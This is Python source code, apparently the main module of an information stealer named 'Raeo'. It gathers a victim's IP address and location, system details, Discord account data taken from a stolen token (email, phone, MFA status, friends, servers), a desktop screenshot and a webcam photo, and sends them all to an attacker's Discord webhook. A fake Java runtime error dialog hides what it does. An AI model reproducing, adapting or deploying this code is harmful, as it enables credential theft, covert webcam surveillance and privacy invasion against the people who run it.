from components import networkinfo, systeminfo, webcam
from components.discordtoken import DiscordToken
from components.config import webhook_url, webcamphoto_check, username, discord_token, systemdata_check, networkdata_check
from discord import SyncWebhook, Embed, File
from tkinter import messagebox

def Main():  
    internet_data = []
    internet_data = []
    # get the ip adress
    if networkdata_check is True:
        internet_data = networkinfo.get__ip()
    else:
        internet_data = ["None", "None", "None", "None", "None", "None"]

    # get system information
    if systemdata_check is True:
        system_data = systeminfo.get_information()
    else:
        system_data = ["None", "None", "None", "None", "None", "None"]

    # get discord information
    if discord_token is True:
        discord_client = DiscordToken()
        user = discord_client.get_user()
        friends = discord_client.get_friends()
        friends_message = ""
        for friend in friends:
            friends_message += friend + ", "

        guilds = discord_client.get_guilds()

        guilds_message = ""
        for guild in guilds: 
            guilds_message += guild + ", "
        

    # take a screenshot of the desktop
    systeminfo.take_screenshot()

    # take a photo with a webcam if available
    try:
        if webcamphoto_check is True:
            webcam.take_photo()
    except:
        print("Webcam access denied")

    # webhook
    webhook = SyncWebhook.from_url(webhook_url)
        

    # embed
    embed = Embed(
        title="**Raeo report**",
        url="https://github.com/areoxy/raeo/",
        description=f"**Internet Data**\n```IP: {internet_data[0]}\nISP: {internet_data[4]}\nCountry: {internet_data[1]}\nRegion: {internet_data[3]}\nCity: {internet_data[2]}```\n-------------------------------------\n**System Data**\n```Username: {system_data[2]}\nHostname: {system_data[5]}\nSystem: {system_data[0]}\nVersion: {system_data[1]}\nCPU: {system_data[3]}\nGPU: {system_data[4]}```\n-------------------------------------\n**Desktop**"
    )
    embed.set_image(url="attachment://screenshot.png")
    embed.set_footer(text="Made by Areo | v1.0.0")


    # discord token embed
    if discord_token is True:
        discord_embed = Embed(
            title="**Discord Account Information**",
            url="https://github.com/areoxy/raeo/",
            description=f"```Username: {user[0]}\nID: {user[1]}\nEmail: {user[2]}\nPhone: {user[3]}\nMFA: {user[4]}```"
        )
        discord_embed.set_footer(text="Made by Areo | v1.0.0")
        discord_embed.add_field(name="**Friends**",value=friends_message)
        discord_embed.add_field(name="**Guilds**", value=guilds_message)
        try:
            webhook.send(
                embed=discord_embed,
                username=username
            )
        except:
            pass

    # send discord 

    try:
        webhook.send(
            embed=embed,
            file=File('.\\screenshot.png', filename='screenshot.png'),
            username=username
        )
    except: 
        print("Failed sending system data webhook")

    if webcamphoto_check is True:
        # embed
        webcam_embed = Embed(
            title="Webcam",
            description=f"**Photo**",
            url="https://github.com/areoxy/raeo/",
        )
        webcam_embed.set_image(url="attachment://webcam.png")
        webcam_embed.set_footer(text="Made by Areo | v1.0.0")

        # send webhook with the webcam photo attached
        try:
            webhook.send(
                embed=webcam_embed,
                file=File('.\\webcam.png', filename='webcam.png'),
                username=username
            )
        except:
            print("Failed sending the webhook with the attached webcam photo")

class App():
    def __init__(self) -> None:
        messagebox.showerror("Error", "Failed starting. RUNTIME ERROR CODE x338 WINDOWS RUNTIME NullPointerException line 39, 45 PLEASE UPDATE JAVA")
        Main()
        return
        

App()